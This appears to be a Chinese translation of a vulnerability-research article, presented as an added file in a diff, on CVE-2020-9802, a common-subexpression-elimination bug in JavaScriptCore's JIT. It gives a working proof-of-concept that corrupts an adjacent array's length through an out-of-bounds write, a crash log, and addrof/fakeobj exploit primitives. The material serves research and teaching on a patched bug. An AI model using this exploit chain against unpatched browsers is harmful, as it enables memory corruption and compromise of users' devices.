@@ -1,0 +1,557 @@
+本文重点介绍在现代web浏览器中挖掘和利用JavaScript引擎漏洞过程中所面临的各种技术挑战，并对当前的漏洞利用缓解措施进行评估。
+
+本文涉及的漏洞CVE-2020-9802，该漏洞已经在iOS
+13.5中得到了修复；而针对该漏洞缓解措施的绕过漏洞CVE-2020-9870和CVE-2020-9910，也已经在iOS 13.6中得到了相应的修复。
+
+由于WebKit浏览器（在iOS系统和ARM引擎的macOS系统上）具有目前最高级的漏洞利用缓解措施，包括PAC和APRR等基于硬件的缓解措施，因此，WebKit自然而然就成为了首选研究对象，更准确的说，应该是它所使用的JavaScript引擎：JavaScriptCore（JSC）。
+
+##  **介绍**
+
+由于目前网上已经存在大量关于JIT编译器的优秀文章，因此，本节只对JavaScript JIT进行简单介绍和回顾。
+
+在这里，我们将以下面简单的JavaScript代码为例进行介绍。
+
+    
+    
+    function foo(o, y) {
+    
+    let x = o.x;
+    
+    return x + y;
+    
+    }
+    
+    
+    
+    
+    for (let i = 0; i < 10000; i++) {
+    
+    foo({x: i}, 42);
+    
+    }
+
+由于JIT编译的开销非常大，通常只对重复执行的代码进行编译处理。因此，函数foo将在解释器（或经济型“基准”JIT）中执行一段时间。在这段时间内，会收集相关的配置文件数据。对于foo函数来说，对于其中的数据可能做出以下推断：
+
+> o: JSObject 属性为.x，偏移量为16
+>
+> x: Int32
+>
+> y: Int32
+
+之后，当优化JIT编译器最终启动时，首先将JavaScript源代码（或者，更可能是解释器字节码）翻译成JIT编译器自己的中间代码。对于DFG来说，JavaScriptCore的优化JIT编译器的工作是由DFGByteCodeParser完成的。
+
+DFG IR中的函数foo最初可能看起来像这样：
+
+v0 = GetById o, .x
+
+v1 = ValueAdd v0, y
+
+Return v1
+
+在这里，GetById和ValueAdd是两种非常通用的（或者说是高级别的）操作，能够处理不同的输入类型（比如，ValueAdd操作也能用于连接字符串）。
+
+接下来，JIT编译器会检查配置文件，并据此推测未来将继续使用相同的输入类型。就这里来说，它会做出以下推断：o的类型将一直是某种JSObject，而x和y的类型则一直为Int32。然而，由于无法保证这些推测始终是正确的，编译器必须对这些推测进行“维护”，通常的做法是采用运行时类型检查，因为这种检查的开销较小。
+
+    
+    
+    CheckType o, “Object with property .x at offset 16”
+    
+    CheckType y, Int32
+    
+    v0 = GetByOffset o, 16
+    
+    CheckType v0, Int32
+    
+    v1 = ArithAdd v0, y
+    
+    Return v1
+
+同时也要注意GetById和ValueAdd是如何被转化为更高效（但不那么通用）的GetByOffset和ArithAdd操作的。在DFG中，这种推测性优化会发生在许多地方，例如，前面讲到的DFGByteCodeParser中。
+
+同时也要注意GetById和ValueAdd是如何被特化为更高效（但不那么通用）的GetByOffset和ArithAdd操作的。在DFG中，这种推测性优化会发生在许多地方，例如，前面讲到的DFGByteCodeParser中。
+
+此时，IR代码中的数据实际上都被赋予了特定的类型，因为在推测维护机制的帮助下，是允许对类型进行推断的。接下来，会对代码进行各种优化，比如循环展开或常量合并等。关于DFG所做的优化工作的概述信息，大家可以从DFGPlan中提取出来。
+
+最后，优化后的IR被翻译成机器代码。在DFG中，这是由DFGSpeculativeJIT直接完成的，而在FTL模式下，DFG的IR首先被翻译成另一种IR，即B3；而B3在经过进一步的优化后，才会被编译成机器代码。接下来，我们将讨论一种具体的优化技术：公共子表达式消除（CSE）。
+
+ **公共子表达式消除（CSE）**
+
+这种优化技术的思想是：找出重复的计算（或表达式），并将它们合并成单个计算。接下来，我们以下面的JavaScript代码为例进行介绍。
+
+    
+    
+    let c = Math.sqrt(a*a + a*a);
+    
+    Assume further that a and b are known to be primitive values (e.g. Numbers), then a JavaScript JIT compiler can convert the code to the following:
+
+如果我们假设a和b为基本数值类型，那么JavaScript JIT编译器可以将上述代码转换为：
+
+    
+    
+    let tmp = a*a;
+    
+    let c = Math.sqrt(tmp + tmp);
+
+这样做可以在运行时可以少执行一次ArithMul操作。这种优化方法称为公用子表达式消除（CSE）。
+
+现在，考虑以下JavaScript代码：
+
+    
+    
+    let c = o.a;
+    
+    f();
+    
+    let d = o.a;
+
+在这里，编译器不会在进行CSE优化时消除第二个属性加载操作，因为在这两个操作之间的函数调用可能会改变属性.a的值。
+
+对于JSC来说，某操作是否可以（以及在什么情况下可以）进行CSE优化是由DFGClobberize决定的。对于ArithMul，DFGClobberize给出的结果是：
+
+    
+    
+    case ArithMul:
+    
+    switch (node->binaryUseKind()) {
+    
+    case Int32Use:
+    
+    case Int52RepUse:
+    
+    case DoubleRepUse:
+    
+    def(PureValue(node, node->arithMode()));
+    
+    return;
+    
+    case UntypedUse:
+    
+    clobberTop();
+    
+    return;
+    
+    default:
+    
+    DFG_CRASH(graph, node, "Bad use kind");
+    
+    }
+
+其中，PureValue的def()表明，该计算不依赖任何上下文，因此，在给定相同输入的情况下，总会得到相同的结果。但是，请注意，PureValue是由该操作的ArithMode来参数化的，它规定了该操作是否应处理整数溢出（例如，通过向解释器求助）。
+
+在这种情况下，参数化可防止对整数溢出进行不同处理的两个ArithMul操作被相互替换。处理溢出的操作通常也称为“检查溢出问题的”操作，而“不检查溢出问题的”操作是不会检测或处理溢出问题的。
+
+相反，对于GetByOffset（可用于属性加载），DFGClobberize则包含：
+
+    
+    
+    case GetByOffset:
+    
+    unsigned identifierNumber = node->storageAccessData().identifierNumber;
+    
+    AbstractHeap heap(NamedProperties, identifierNumber);
+    
+    read(heap);
+    
+    def(HeapLocation(NamedPropertyLoc, heap, node->child2()), LazyNode(node));
+
+这实质上就是说，这个操作产生的值取决于NamedProperty“抽象堆”。因此，只有在两个GetByOffset操作之间没有对NamedProperties抽象堆（即存放属性值的内存空间）执行写操作时，消除第二个GetByOffset才是合理的。
+
+##  **缺陷**
+
+实际上，DFGClobberize并没有将ArithNegate操作的ArithMode考虑在内：
+
+    
+    
+    case ArithNegate:
+    
+    if (node->child1().useKind() == Int32Use || ...)
+    
+    def(PureValue(node));          // <- only the input matters, not the ArithMode
+
+这可能会导致CSE用一个不检查溢出问题的ArithNegate操作来代替检查溢出问题的ArithNegate操作。对于ArithNegate(32位整数求反)操作来说，整数溢出只可能发生在下述特定情况下：
+
+对INT_MIN：-2147483648求反时。这是因为2147483648无法表示为32位有符号整数，因此-INTMIN会导致整数溢出，并再次得到INTMIN。
+
+通过研究DFGClobberize中CSE的定义，思考为什么某些PureValue(以及哪些PureValue)需要使用ArithMode进行参数化，然后搜索缺少该参数化的情况，就能找到这种类型的溢出漏洞。
+
+其实，该漏洞的修复方法也非常简单：
+
+    
+    
+    -            def(PureValue(node));
+    
+    +            def(PureValue(node, node->arithMode()));
+
+实际上，这就是让CSE将ArithNegate操作的arithMode（溢出检查模式和溢出非检查模式）考虑在内。这样，具有不同模式的两个ArithNegate操作将不允许相互替换。
+
+除了ArithNegate，DFGClobberize也疏忽了ArithAbs操作的ArithMode。
+
+请注意，这种类型的漏洞很难通过模糊测试检测出来，因为：
+
+> fuzzer必须在相同的输入上创建两个ArithNegate操作，并且要具有不同的ArithMode；
+>
+> fuzzer需要触发ArithMode的差异会导致重大问题的情形，并且，还需要在这种情形下对INT_MIN值取反；
+>
+>
+> 除非引擎具有用于尽早检测此类问题的定制“消毒器”，并且除非进行了差异化模糊测试，否则fuzzer仍会把这种情况归结为内存违例或断言失败。如下一节所示，该步骤可能是最难的一步。
+
+##  **实现越界访问**
+
+下面显示的JavaScript函数，将利用上述漏洞，通过一个任意索引（在本例中为7）实现对JSArray的越界访问：
+
+    
+    
+    function hax(arr, n) {
+    
+    n |= 0;
+    
+    if (n < 0) {
+    
+    let v = (-n)|0;
+    
+    let i = Math.abs(n);
+    
+    if (i < arr.length) {
+    
+    if (i & 0x80000000) {
+    
+    i += -0x7ffffff9;
+    
+    }
+    
+    if (i > 0) {
+    
+    arr[i] = 1.04380972981885e-310;
+    
+    }
+    
+    }
+    
+    }
+    
+    }
+
+接下来，我们逐步介绍如何构建该漏洞的PoC。在本节的末尾，还将提供上述函数的注释版本。
+
+首先，ArithNegate仅用于对整数求反（更通用的ValueNegate操作可以对所有JavaScript值求反），但在JavaScript规范中，数字通常是浮点值。
+
+因此，有必要向编译器“指出”输入值始终为整数。这很容易实现，方法是首先执行逐位运算，这样得到的总是32位有符号整数值：
+
+n = n|0; // n will be an integer value now
+
+这样，我们就可以构造一个不会对溢出问题进行检查的算术运算（以后将使用该运算对检查溢出问题的算术运算进行CSE处理）：
+
+    
+    
+    n = n|0;
+    
+    let v = (-n)|0;
+
+就本例来说，在DFGFixupPhase期间，n的求反操作将被转换为不会对溢出问题进行检查的ArithNeg操作。
+
+编译器将忽略溢出检查，因为这里进行求反的值的唯一用途是按位或运算，该运算对于溢出的值和“正确的”值的结果是一样的：
+
+    
+    
+    js> -2147483648 | 0
+    
+    -2147483648
+    
+    js> 2147483648 | 0
+    
+    -2147483648
+
+接下来，需要构造一个以n为输入并且检查溢出问题的算术运算。获得算术运算的一个有趣的方法是让编译器将一个ArithAbs操作强度折减（Strength
+reduction）为一个ArithNegate操作。
+
+只有当编译器能够证明n是负数时，才会出现这种情况。不过，实现这一点并非难事，因为DFG的IntegerRangeOptimization过程是路径敏感的：
+
+    
+    
+    n = n|0;
+    
+    if (n < 0) {
+    
+    // Compiler knows that n will be a negative integer here
+    
+    let v = (-n)|0;
+    
+    let i = Math.abs(n);
+    
+    }
+
+在字节码解析过程中，对Math.abs的调用会先简化为ArithAbs操作，因为编译器能够证明该调用总是会导致mathAbs函数的执行，所以不妨用ArithAbs操作作为代替，因为该操作不仅具有相同的运行时语义，同时还无需在运行时调用函数。编译器实质上就是这样内联Math.abs的。
+
+之后，IntegerRangeOptimization过程会将ArithAbs转换为一个检查溢出问题的ArithNegate（ArithNegate必须检查溢出，因为n没有将INT_MIN排除在外）。这样一来，if语句里面的两个语句实质上就变成了下面的样子（DFG
+IR伪代码）：
+
+v = ArithNeg(unchecked) n
+
+i = ArithNeg(checked) n
+
+其中，由于漏洞的缘故，经过CSE优化以后上述代码将变成：
+
+v = ArithNeg(unchecked) n
+
+i = v
+
+此时，如果用INT_MIN作为变量n的取值来调用误编译的函数，会导致变量i的值也变成INT_MIN，尽管它本应是一个正数。
+
+到目前为止，这只是一个正确性问题，还算不上安全问题。把这个bug变成安全问题的一个（也可能是唯一的）方法是滥用一个已经在安全研究人员中广为人知的JIT优化：边界检查消除优化技术。
+
+回到IntegerRangeOptimization过程，i的值已经被标记为正数。然而，要想发生边界检查消除，还必须确定该值小于被索引的数组的长度。这很容易实现。
+
+    
+    
+    function hax(arr, n) {
+    
+    n = n|0;
+    
+    if (n < 0) {
+    
+    let v = (-n)|0;
+    
+    let i = Math.abs(n);
+    
+    if (i < arr.length) {
+    
+    arr[i];
+    
+    }
+    
+    }
+    
+    }
+
+如果现在触发该漏洞，i的值将是INT_MIN，因此，这里将进行相应的比较并执行数组访问。然而，由于IntegerRangeOptimization错误地（尽管技术上将并不是它的错）将i确定为始终在边界内，因此边界检查将被移除。
+
+在触发该漏洞之前，必须设法让JavaScript代码完成JIT编译。为此，只需重复执行代码达到一定次数即可。然而，对于arr的索引访问只会被（SSALoweringPhase）降级为CheckInBounds（稍后将被消除）；只有当访问被推测为在边界内时，才会降级为不进行边界检查的GetByVal操作。
+
+如果在基线JIT的解释或执行过程中经常观察到访问是越界的，则不会出现这种情况。因此，在对函数进行“训练”的过程中，有必要使用合理的、位于边界内的索引。
+
+    
+    
+    for (let i = 1; i <= ITERATIONS; i++) {
+    
+    let n = -4;
+    
+    if (i == ITERATIONS) {
+    
+    n = -2147483648;        // INT_MIN
+    
+    }
+    
+    hax(arr, n);
+    
+    }
+
+在JSC中运行这段代码时，将会发生崩溃：
+
+    
+    
+    lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+    
+    (lldb) r
+    
+    Process 12237 stopped
+    
+    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1c1fc61348)
+    
+    frame #0: 0x000051fcfaa06f2e
+    
+    ->  0x51fcfaa06f2e: movsd  xmm0, qword ptr [rax + 8*rcx] ; xmm0 = mem[0],zero
+    
+    Target 0: (jsc) stopped.
+    
+    (lldb) reg read rcx
+    
+    rcx = 0x0000000080000000
+
+然而，这里的不便之处在于，越界索引（在rcx中）总是INT_MIN，因此，这里会访问数组后的0x80000000 * 8 =
+16GB处的内存空间。尽管这个越界漏洞可以被利用，但绝不是一个最佳的利用原语。
+
+实现具有任意索引的OOB访问的终极招式是从i中减去一个常数，该常数会将INT_MIN变为任意正数。由于i被（DFG编译器）认为始终为正，因此，减法操作无需检查溢出问题，因此，即使发生溢出，也不会引起注意。
+
+但是，由于减法会使有关下限的整数范围信息无效，因此之后需要执行额外的“if i >
+0”检查，以再次触发边界检查消除优化。此外，由于减法会将训练过程中使用的整数转换为越界索引，因此只有在输入值为负时才有条件执行该减法。
+
+幸运的是，DFG编译器还不是太聪明，无法确定该条件永远不成立，在这种情况下，它会减法运算进行全面优化！
+
+下面显示的还是原来的函数，不同之处在于，这里加了相关的注释。当经过了JIT编译且令n取值为INT_MIN时，将导致将受控的数值（0x0000133700001337）越界写入到内存中arr后面的JSArray的长度字段中。
+
+请注意，这一步的成功取决于正确的堆布局。但是，由于该漏洞非常强大，足以用于进行受控的OOB读取操作，因此可以在触发内存损坏之前确保存在正确的堆布局。
+
+    
+    
+    function hax(arr, n) {
+    
+    // Force n to be a 32bit integer.
+    
+    n |= 0;
+    
+    // Let IntegerRangeOptimization know that
+    
+    // n will be a negative number inside the body.
+    
+    if (n < 0) {
+    
+    // Force "non-number bytecode usage" so the negation
+    
+    // becomes unchecked and as such INT_MIN will again
+    
+    // become INT_MIN in the last iteration.
+    
+    let v = (-n)|0;
+    
+    // As n is known to be negative here, this ArithAbs
+    
+    // will become a ArithNegate. That negation will be
+    
+    // checked, but then be CSE'd for the previous,
+    
+    // unchecked one. This is the compiler bug.
+    
+    let i = Math.abs(n);
+    
+    // However, IntegerRangeOptimization has also marked
+    
+    // i as being >= 0...
+    
+    if (i < arr.length) {
+    
+    // .. so here IntegerRangeOptimization now believes
+    
+    // i will be in the range [0, arr.length) while i
+    
+    // will actually be INT_MIN in the final iteration.
+    
+    // This condition is written this way so integer
+    
+    // range optimization isn't able to propagate range
+    
+    // information (in particular that i must be a
+    
+    // negative integer) into the body.
+    
+    if (i & 0x80000000) {
+    
+    // In the last iteration, this will turn INT_MIN
+    
+    // into an arbitrary, positive number since the
+    
+    // ArithAdd has been made unchecked by integer range
+    
+    // optimization (as it believes i to be a positive
+    
+    // number) and so doesn't bail out when overflowing
+    
+    // int32.
+    
+    i += -0x7ffffff9;
+    
+    }
+    
+    // This conditional branch is now necessary due to
+    
+    // the subtraction above. Otherwise,
+    
+    // IntegerRangeOptimization couldn’t prove that i
+    
+    // was always positive.
+    
+    if (i > 0) {
+    
+    // In here, IntegerRangeOptimization again believes
+    
+    // i to be in the range [0, arr.length) and thus
+    
+    // eliminates the CheckBounds node, leading to a
+    
+    // controlled OOB access. This write will then corrupt
+    
+    // the header of the following JSArray, setting its
+    
+    // length and capacity to 0x1337.
+    
+    arr[i] = 1.04380972981885e-310;
+    
+    }
+    
+    }
+    
+    }
+    
+    }
+
+##  **Addrof/Fakeobj**
+
+此时，我们可以构建两个低级漏洞利用原语addrof和fakeobj。其中，addrof(Obj)原语用于返回给定JavaScript对象在内存中的地址（以双精度浮点数存储）：
+
+    
+    
+    let obj = {a: 42};
+    
+    let addr = addrof(obj);
+    
+    // 2.211548541e-314 (0x000000010acdc250 as 64bit integer)
+    
+    这个 fakeobj（地址） 原语返回包含给定地址的JSValue作为有效负载：
+    
+    let obj2 = fakeobj(addr);
+    
+    obj2 === obj;
+    
+    // true
+
+实际上，这两个原语非常有用，在它们的帮助下，我们可以：突破堆的ASLR保护机制，将受控数据保存到已知地址中；此外，它们还能提供一种构造fake对象并将其“注入”到引擎中的方法。
+
+除此之外，我们也可以使用两个具有不同存储类型的JSArray来实现这两个原语。具体来说，就是通过将存储（未经装箱处理的/原始的）双精度值的JSArray与存储JSValues（经过装箱处理的/标记值，例如指向JSObjects的指针）的JSArray重叠在一起来实现上述原语：![IMG_256](https://image.3001.net/images/20210527/1622106324_60af60d45e14cadff8a4b.gif!small)![image.png](https://image.3001.net/images/20210527/1622106324_60af60d4c6320b7d38343.png!small)
+
+这样的话，就可以通过float_arr，像读写双精度浮点数那样来读写obj_arr中的指针值了：
+
+    
+    
+    let noCoW = 13.37;
+    
+    let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+    
+    let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+    
+    let obj_arr = [{}, {}, {}, {}, {}, {}, {}];
+    
+    // Trigger the bug to write past the end of the target array and
+    
+    // thus corrupting the length of the float_arr following it
+    
+    hax(target, n);
+    
+    assert(float_arr.length == 0x1337);
+    
+    // (OOB) index into float_arr that overlaps with the first element
+    
+    // of obj_arr.
+    
+    const OVERLAP_IDX = 8;
+    
+    function addrof(obj) {
+    
+    obj_arr[0] = obj;
+    
+    return float_arr[OVERLAP_IDX];
+    
+    }
+    
+    function fakeobj(addr) {
+    
+    float_arr[OVERLAP_IDX] = addr;
+    
+    return obj_arr[0];
+    
+    }
+
+变量noCoW的用途有些不太直观：用来防止JSC将数组分配为写后复制数组，否则会导致错误的堆布局。
+
+##  **小结**
+
+这是一个“非标准”JIT编译器bug的演练。请记住，与这种类型的漏洞相比，有大量其他类型的（JIT）漏洞更容易被利用；另一方面，事实上，该漏洞的利用方法（到此为止）还没有进行详细介绍，因为本文的大部分篇幅都是在回顾JSC和JIT编译器的内部结构。
+
